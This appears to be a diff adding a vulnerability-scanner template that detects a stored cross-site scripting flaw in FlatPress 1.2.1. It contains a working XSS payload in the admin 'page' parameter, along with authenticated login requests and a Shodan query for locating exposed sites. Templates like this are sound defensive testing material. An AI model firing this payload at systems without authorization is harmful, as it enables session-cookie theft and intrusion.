@@ -1,0 +1,61 @@
+id: flatpress-xss
+
+info:
+  name: FlatPress 1.2.1 - Stored Cross-Site Scripting
+  author: arafatansari
+  severity: medium
+  description: |
+    FlatPress 1.2.1 contains a stored cross-site scripting vulnerability that allows for arbitrary execution of JavaScript commands through blog content. An attacker can steal cookie-based authentication credentials and launch other attacks. Note: this is similar to CVE-2021-41432, however this attack uses the "page" parameter.
+  reference:
+    - https://github.com/flatpressblog/flatpress/issues/153
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: http.html:"Flatpress"
+  tags: flatpress,xss,authenticated,oss,intrusive
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykGJmx9vKsePrMkVp
+
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp
+        Content-Disposition: form-data; name="user"
+
+        {{username}}
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp
+        Content-Disposition: form-data; name="pass"
+
+        {{password}}
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp
+        Content-Disposition: form-data; name="submit"
+
+        Login
+        ------WebKitFormBoundarykGJmx9vKsePrMkVp--
+      - |
+        GET /admin.php?p=static&action=write&page=%22onfocus%3d%22alert%28document.cookie%29%22autofocus%3d%22 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'value=""onfocus="alert(document.cookie)"autofocus=""'
+          - 'FlatPress'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100fa2cc4b041819edc1dc91ef9f266cebb8b68bfc43436b271e4985a9a453d9d3e022034dfdd99412f2ed6b8e769756810f1fd0451658dfed145f36f38f86086c31863:922c64590222798bb761d5b6d8e72950
